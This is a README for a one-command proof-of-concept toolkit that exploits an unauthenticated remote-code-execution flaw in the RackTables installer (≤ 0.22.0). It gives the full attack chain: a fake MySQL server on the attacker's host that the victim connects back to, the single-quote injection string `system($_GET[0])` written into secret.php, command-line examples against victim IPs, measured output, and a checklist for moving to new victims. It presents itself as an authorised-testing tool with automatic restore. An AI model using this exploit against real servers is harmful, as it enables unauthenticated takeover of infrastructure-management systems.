# RackTables unauthenticated RCE verification toolkit (poc)

> Positioning: **one attacker machine -> any RackTables victim**.
> Copy this whole directory to the attacker machine (Kali / any Linux) and a single command does it all: unauthenticated injection -> harmless command verification -> **remote restore of the target `secret.php`**.
> Applicable to: RackTables ≤ 0.22.0, with the installer reachable without authentication and `secret.php` writable.
> Local example: `bash ./poc.sh 172.20.32.1:8300`

---

## 1. Files

| File | Purpose |
|---|---|
| `poc.sh` | **One-command PoC main program**. 8 steps: environment check -> recon -> writability check -> choose restore source -> start fake MySQL -> unauthenticated injection -> harmless command verification -> remote restore and re-check |
| `backups/` | **Restore source directory (filled in by the user)**. Put each victim's original `inc/secret.php` here as `backups/<IP>_<port>_secret.php`; the script prefers it for the restore |
| `secret-init.php` | **Fallback restore source**: used only when `backups/` has no matching file (the lab baseline shipped with the package, 2296 bytes, connects to `127.0.0.1:3401/rt_env`) |
| `fake_mysql_any.py` | **Fake MySQL service**: accepts any username/any password and only completes the handshake with OK, so the victim's `new PDO()` connects successfully (no real database, no account needed) |
| `fake_mysql2.py` | Backup version of the fake MySQL (any username, empty password only) |
| `start_fake_db.sh` | Start the fake MySQL on its own (for manual debugging; `poc.sh` starts it itself, so normally you do not run this by hand) |
| `README.md` | This document |

---

## 2. Attack chain (why it works)

```
Attacker                                          Victim (RackTables ≤ 0.22.0)
  │  ① GET /index.php?module=installer              installer page reachable unauthenticated
  │────────────────────────────────────────────────▶│
  │  ② POST install form (mysql_host=attacker, fake MySQL)   new PDO() connects back to the attacker
  │◀───────────────────── handshake OK ─────────────│
  │                                                  │ ③ fopen('w+') writes secret.php
  │  ④ injection string lands in secret.php:          │    $db_username = 'x'; system($_GET[0]); //'
  │  ⑤ GET /index.php?0=echo PWN-xxx                 │ the injected code runs on every request
  │◀──────────────────── PWN-xxx ───────────────────│
  │  ⑥ POST install form (original DSN)               writes the original configuration back → site recovers
  │────────────────────────────────────────────────▶│
```

Key points:
- The installer branch does not authenticate (`index.php:295-300`); before writing the file it only checks `is_writable($path_to_secret_php)` and whether `new PDO()` succeeds.
- Injection point: the username/password are **concatenated inside single quotes** into the PHP source (`inc/install.php:239-242`), and `'` can close the escape.
- Therefore, as long as the attacker has a "fake database" the victim can connect back to, the handshake can be completed before the target writes the file → write → persistent RCE.

---

## 3. Restore mechanism (important)

`inc/install.php:233` uses `fopen($path_to_secret_php, 'w+')` to **truncate directly**, and `239-242` only writes the DSN/account/password supplied by the attacker, **without backing up or keeping the original configuration**.
So "restore" means: **write the DSN back through the same unauthenticated installer, using the original configuration the attacker holds in advance** — no access to the victim's file system is needed.

| Priority | Restore source | Trigger condition | Notes |
|---|---|---|---|
| 1 | `--restore-file <path>` | specified explicitly | the original `secret.php` at any path |
| 2 | `--restore-db 'user:pass@host:port/db'`<br>(also accepts `host:port:db:user:pass`) | specified explicitly | used when only a connection string is available, without a file |
| 3 | **`backups/<IP>_<port>_secret.php`** | default | the user puts the victim's original `secret.php` here; a file name containing the target IP is also recognised; when `backups/` holds only one usable file, that one is taken |
| 4 | `secret-init.php` | no match in `backups/` | the lab baseline shipped with the package; for a real target it prints a prominent warning (a loopback DSN may break the site) |
| 5 | the target `secret.php` visible on the attacker machine | with a shared file system | automatically snapshotted to `backups/<IP>_<port>_secret.php` and then written back |
| — | none of the above | — | **destructive injection is refused by default**, only the non-destructive check is done; `--force` runs it anyway (with no restore) |

Restore means (all remote HTTP, or optional command execution):

1. **Installer write-back (default, generic)**: parse `host/port/dbname/user/password` from the restore source, then POST the unauthenticated installer once more → the victim connects to its own DB → the DSN is restored and the site is usable.
2. **Byte-level overwrite (optional)**: after a successful injection the attacker already has command execution; if the remote `secret.php` path is located (automatic `find` or given with `--secret-path`), the content is written back in base64 chunks and verified with `sha256sum`.
3. **Local cp (same machine / shared file system only)**: when `--docroot` or automatic probing finds the target directory, copy directly and verify the SHA256.

> Note: channel 1 writes the installer template (it loses customisations such as LDAP/SAML/plugin directories), so it is a "business-usable restore"; for **byte-level consistency** use channel 2/3.

**Preparing the restore source for a new target** (recommended practice):

```bash
# The authorising party provides a copy of the target's current inc/secret.php, named with the target identifier
cp /from-the-authorising-party/secret.php  backups/10.0.0.5_8080_secret.php
```

---

## 4. Environment requirements

**Attacker machine**
- bash, curl, python3
- `python3 -c "import mysql_mimic"`; if missing run `pip3 install --break-system-packages mysql-mimic`

**Victim**
- `GET /index.php?module=installer` reachable without authentication and containing `RackTables installation`
- `inc/secret.php` exists and is writable (after hardening such as `chmod 440` it cannot be exploited)
- able to **actively connect back** to the attacker's `IP:3308` (or the address/port given by `--attacker-ip` / `--db-port`)
- the Web service listens on `0.0.0.0`, not on `127.0.0.1`

---

## 5. Quick start

```bash
# 1) Install the dependency (once)
pip3 install --break-system-packages mysql-mimic

# 2) Place the restore source (strongly recommended; otherwise it falls back to secret-init.php)
cp /path/to/target/inc/secret.php ./backups/10.0.0.5_8080_secret.php

# 3) Run it
bash ./poc.sh 10.0.0.5:8080 --attacker-ip <attacker IP reachable from the victim>
```

---

## 6. Command options

```bash
bash ./poc.sh <target> [options]
```

| Option | Description | Example |
|---|---|---|
| `<target>` | victim address, required; supports `host:port`, `http(s)://host/path` | `172.20.32.1:8300` |
| `--cmd '<command>'` | harmless command used for verification, default `echo PWN-<random 8 chars>` | `--cmd 'whoami'` |
| `--attacker-ip <ip>` | the attacker address written into the victim configuration (defaults to the first local IP); **must be set when crossing network segments** | `--attacker-ip 192.168.1.50` |
| `--db-port <port>` | fake MySQL port, default `3308`; use `443` when only outbound 443 is allowed | `--db-port 443` |
| `--restore-file <file>` | preferred restore source: the original `secret.php` at any path | `--restore-file ./backups/a.php` |
| `--restore-db <string>` | restore source when only a connection string is available | `--restore-db 'rt:pass@127.0.0.1:3306/racktables'` |
| `--secret-path <path>` | absolute path of `secret.php` on the victim (enables the byte-level overwrite; if not located it runs `find` automatically) | `--secret-path /var/www/racktables/wwwroot/inc/secret.php` |
| `--docroot <path>` | the victim docroot visible on the attacker machine (same machine / shared file system only); probed automatically by default | `--docroot /mnt/e/.../env/wwwroot` |
| `--no-docroot` | declares "I cannot see the victim's file system", skipping local probing and the local fallback | |
| `--force` | inject even without a restore source (no restore, manual repair required) | |
| `--keep-db` | keep the fake MySQL after finishing (by default it stops on exit) | |
| `-h, --help` | show usage | |

**Common combinations**

```bash
# A. Local lab environment (falls back to secret-init.php when backups is empty)
bash ./poc.sh 172.20.32.1:8300

# B. LAN/remote victim: specify the attacker address the victim can reach
bash ./poc.sh 10.0.0.5:8080 --attacker-ip 192.168.1.50

# C. Purely remote (no file system visibility), verified to restore without docroot
bash ./poc.sh 10.0.0.5:8080 --attacker-ip 192.168.1.50 --no-docroot

# D. Only a connection string, no file
bash ./poc.sh 10.0.0.5:8080 --attacker-ip 192.168.1.50 \
  --restore-db 'rt_user:pass@127.0.0.1:3306/racktables_db'

# E. Want a byte-level restore (needs the remote path)
bash ./poc.sh 10.0.0.5:8080 --attacker-ip 192.168.1.50 \
  --restore-file ./backups/10.0.0.5_8080_secret.php \
  --secret-path /var/www/racktables/wwwroot/inc/secret.php
```

---

## 7. Execution flow (8 steps)

| Step | Content | Expected |
|---|---|---|
| 0 | Environment check | curl / python3 / mysql-mimic / fake DB script ready |
| 1 | Recon | `GET /` returns a status code; the installer page shows `RackTables installation` |
| 2 | Non-destructive writability check | POST points to `127.0.0.1:1`, it must fail and writes nothing; a `Database connection failed` response means "writable" |
| 3 | Prepare the restore source | chosen by the priority in section 3; refused if there is none (unless `--force`) |
| 4 | Start the fake MySQL | the attacker machine listens on `0.0.0.0:3308`, accepting any username/password |
| 5 | Unauthenticated injection | the victim returns `written successfully`, `secret.php` now contains the injection string |
| 6 | Harmless command verification | `GET /index.php?0=<cmd>` echoes the command result |
| 7 | Remote restore + re-check | installer writes the original DSN back → (optional) byte-level overwrite → the command line is gone → `GET /` status matches the pre-attack value |
| 8 | Summary | `Passed N / Failed M` and the exit code |

---

## 8. Measured output

**A. With `backups/<IP>_<port>_secret.php` (the backup is preferred)**

```text
[4] Prepare the restore source (backups/ first, then secret-init.php)
   PASS  Restore source: target snapshot in backups/ /home/kali/poc/backups/172.20.32.1_8300_secret.php (2296 bytes, DSN=mysql:host=127.0.0.1;port=3401;dbname=rt_env)
   Restore channel: unauthenticated installer write-back (host=127.0.0.1:3401, db=rt_env, user=rt_env)
   The victim only has to be able to reach this DB itself; the attacker machine needs no access to the target file system
[5] Unauthenticated injection   PASS  Write succeeded
[6] Harmless command            PASS  RCE confirmed: command output [PWN-ed0fa4fb]; whoami -> desktop-401p99s\tyy
[7] Remote restore              PASS  secret.php written back with the original configuration through the unauthenticated installer (target DSN restored)
                                PASS  Re-check: the command line is gone (no longer executed)
                                PASS  Business status unchanged (GET / -> 401)
Passed 11 / Failed 0
Conclusion: the unauthenticated RCE holds and the target secret.php has been restored remotely.
```

**B. Purely remote `--no-docroot` (the victim file system is never touched)**

```text
[7] Remote restore              PASS  secret.php written back with the original configuration through the unauthenticated installer (target DSN restored)
                                Target secret.php path not located (use --secret-path to specify it), the installer write-back is the fallback
                                PASS  Re-check: the command line is gone (no longer executed)
                                PASS  Business status unchanged (GET / -> 401)
Passed 10 / Failed 0
Conclusion: the unauthenticated RCE holds and the target secret.php has been restored remotely.
```

---

## 9. Exit codes

| Exit code | Meaning |
|---|---|
| `0` | verified and restored (also returns 0 with `--force`, but the conclusion notes "not restored") |
| `1` | some item failed (unreachable / not writable / injection failed / restore failed) |
| `2` | usage or environment error, or **refused to run because there was no restore source** (missing dependency, target written as localhost, no backup) |

---

## 10. FAQ

| Symptom | Cause | Handling |
|---|---|---|
| `Victim unreachable (000)` | bound to `127.0.0.1` only, or blocked by a firewall | bind `0.0.0.0`; allow the port (on Windows note the two layers: the normal firewall + the Hyper-V firewall) |
| Target written as `localhost` exits immediately | on the attacker machine localhost points to itself | use an address the victim can reach (usually the default gateway) |
| `Database connection failed` | the victim cannot reach the attacker `IP:3308` | check that the fake DB is running, that `--attacker-ip` is correct, and that the outbound port is allowed |
| `not writable` | the target is hardened (`secret.php` read-only) | the target does not meet the conditions, verification does not hold |
| `Refusing to run the destructive injection` | no restore source at all | place `backups/<IP>_<port>_secret.php`, or use `--restore-file` / `--restore-db` |
| The command still executes after the restore | opcache / process cache | reload `php-fpm`/`httpd` on the target, or wait and retry |
| The site reports a database error after the write-back | the restore source DSN is not this victim's database (common when `secret-init.php` is misused) | put the victim's own `secret.php` into `backups/` and rerun |
| Byte-level overwrite did not succeed | the remote path was not located / no `base64` | specify the path with `--secret-path`; on Windows targets it degrades to the installer write-back automatically |

---

## 11. Security and compliance

1. Use only against **authorised** targets; by default only a harmless command (`echo`) is executed, and no business data is read or written.
2. After verification `secret.php` is restored remotely automatically; **when there is no restore source at all the script refuses to run by default**, avoiding damage that cannot be cleaned up.
3. The fake MySQL stops on exit (`trap` cleanup; `--keep-db` keeps it for debugging).
4. `secret-init.php` / `backups/*` contain database credentials; keep them safe, do not commit them to a public repository and do not expose the fake MySQL on the public internet for a long time.
5. The injection inherently overwrites the victim's `secret.php`, so even with a restore there is a short unavailability window — always run it inside the authorised window.

---

## 12. Checklist for switching to another victim

1. `curl -s http://<target>/index.php?module=installer | grep -i 'RackTables installation'` returns output.
2. Obtain the victim's current `inc/secret.php` and save it as `backups/<IP>_<port>_secret.php`.
3. Confirm the victim can reach the attacker machine in reverse: listen with `nc -lvv 3308` on the attacker and have the authorising party verify from the victim side with `nc -vz <attacker IP> 3308`.
4. Run `bash ./poc.sh <target> --attacker-ip <reachable IP>`.
5. When you see `Passed N / Failed 0` and `Conclusion: ... restored remotely`, re-check that the victim login page is normal.
